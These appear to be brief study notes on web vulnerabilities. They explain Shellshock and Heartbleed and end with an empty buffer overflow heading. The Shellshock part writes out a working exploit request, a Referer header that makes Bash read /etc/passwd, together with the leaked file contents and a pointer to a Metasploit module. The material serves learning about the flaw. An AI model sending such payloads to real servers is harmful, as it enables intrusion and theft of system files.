# Shell shock
Shellshock is a security bug causing Bash to execute commands from  environment variables unintentionally. In other words if exploited the  vulnerability allows the attacker to remotely issue commands on the  server, also known as remote code execution. Even though Bash is not an  internet-facing service, many internet and network services such as web  servers use environment variables to communicate with the server's  operating system.
Since the environment variables are not sanitized properly by Bash  before being executed, the attacker can send commands to the server  through HTTP requests and get them executed by the web server operating  system. The shellshock vulnerability

Many are concerned because the Shellshock vulnerability is very easy  to exploit through web applications running on vulnerable servers as  shown in the following example. The attacker crafts an HTTP request that  contains the below headers:

ET http://shellshock.testsparker.com/cgi-bin/netsparker.cgi HTTP/1.1
User-Agent: Netsparker
Host: shellshock.testsparker.com
Referer: () { :;}; echo "NS:" $(</etc/passwd)
Once the target server receives the HTTP request with the above  headers, it responds by sending the content of the file /etc/passwd, as  seen in the below HTTP response:
HTTP/1.0 200 OK
Server: nginx/1.2.1
Date: Fri, 26 Sep 2014 11:22:43 GMT
Content-Type: text/html
NS: root:x:0:0:root:/root:/bin/bash
daemon: x:1:1:daemon:/usr/sbin:/bin/sh
bin: x:2:2:bin:/bin:/bin/sh
sys: x:3:3:sys:/dev:/bin/sh
sync: x:4:65534:sync:/bin:/bin/sync
games: x:5:60:games:/usr/games:/bin/sh
man: x:6:12:man:/var/cache/man:/bin/sh
lp: x:7:7:lp:/var/spool/lpd:/bin/sh
mail: x:8:8:mail:/var/mail:/bin/sh
news: x:9:9:news:/var/spool/news:/bin/sh
uucp: x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy: x:13:13:proxy:/bin:/bin/sh
www-data: x:33:33:www-data:/var/www:/bin/sh
backup: x:34:34:backup:/var/backups:/bin/sh
list: x:38:38:Mailing List Manager:/var/list:/bin/sh
irc: x:39:39:ircd:/var/run/ircd:/bin/sh
gnats: x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody: x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid: x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim: x:101:103::/var/spool/exim4:/bin/false
messagebus: x:102:106::/var/run/dbus:/bin/false
avahi: x:103:107:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
sshd: x:104:65534::/var/run/sshd:/usr/sbin/nologin
mysql: x:105:111:MySQL Server,,,:/nonexistent:/bin/false
Connection: close

===> msf exploit can be used

# Heartbleed
The heartbleed bug is a serious vulnerability in the popular OpenSSL library, which is used to provide SSL functionality on web servers. The vulnerability allows malicious hackers to steal private information. Once exploited the malicious attacker can access sections of the web server's memory where sensitive data such as users' passwords are stored
This also means that the malicious attacker can retrieve the web server's private key hence can decrypt any encrypted information sent to the websites and web applications running on the web server itself.


# BufferOverflow